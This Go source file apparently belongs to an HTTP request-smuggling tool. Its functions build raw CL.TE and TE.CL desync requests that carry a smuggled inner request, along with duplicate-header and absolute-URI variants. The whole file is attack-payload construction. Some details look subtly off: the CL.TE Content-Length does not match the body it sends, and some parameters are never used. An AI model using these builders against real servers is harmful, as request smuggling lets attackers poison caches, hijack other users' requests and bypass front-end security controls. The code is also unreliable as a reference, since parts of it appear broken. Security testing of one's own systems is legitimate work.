package rawhttp

import (
    "fmt"
    "time"
)

// BuildCLTE constructs a Content-Length / Transfer-Encoding desync request.
// Frontend reads Content-Length, backend reads Transfer-Encoding: chunked.
func BuildCLTE(targetURL, path, smugglePrefix, smuggleSuffix, host string, useHTTP2 bool) []byte {
    // Inner request (what the frontend thinks is the body)
    inner := fmt.Sprintf("%s / HTTP/1.1\r\nHost: %s\r\n\r\n", smugglePrefix, host)
    innerLen := len(inner)

    // Outer request
    outer := fmt.Sprintf(
        "POST %s HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Content-Type: application/x-www-form-urlencoded\r\n"+
            "Content-Length: %d\r\n"+
            "Transfer-Encoding: chunked\r\n"+
            "\r\n"+
            "0\r\n\r\n"+
            "%s%s"+
            "0\r\n\r\n",
        path, host, innerLen,
        inner, smuggleSuffix,
    )

    return []byte(outer)
}

// BuildTECL constructs a Transfer-Encoding / Content-Length desync request.
func BuildTECL(targetURL, path, smugglePrefix, smuggleSuffix, host string) []byte {
    inner := fmt.Sprintf("%s / HTTP/1.1\r\nHost: %s\r\n\r\n", smugglePrefix, host)
    innerChunk := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", len(inner), inner)

    outer := fmt.Sprintf(
        "POST %s HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Content-Type: application/x-www-form-urlencoded\r\n"+
            "Content-Length: 4\r\n"+
            "Transfer-Encoding: chunked\r\n"+
            "\r\n"+
            "%s",
        path, host, innerChunk,
    )

    return []byte(outer)
}

// BuildDupHeaders duplicates security-relevant headers.
func BuildDupHeaders(method, path, host string, dupHeaders [][2]string) []byte {
    var b []byte
    b = append(b, []byte(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, path))...)
    b = append(b, []byte(fmt.Sprintf("Host: %s\r\n", host))...)
    for _, kv := range dupHeaders {
        b = append(b, []byte(fmt.Sprintf("%s: %s\r\n", kv[0], kv[1]))...)
    }
    b = append(b, []byte("\r\n")...)
    return b
}

// BuildAbsoluteURI sends the full URL in the request line.
func BuildAbsoluteURI(method, targetURL, host string) []byte {
    return []byte(fmt.Sprintf(
        "%s %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n",
        method, targetURL, host,
    ))
}

// DefaultSmugglePrefix is a common prefix for smuggling tests.
const DefaultSmugglePrefix = "GET"

func DefaultTimeout() time.Duration {
    return 10 * time.Second
}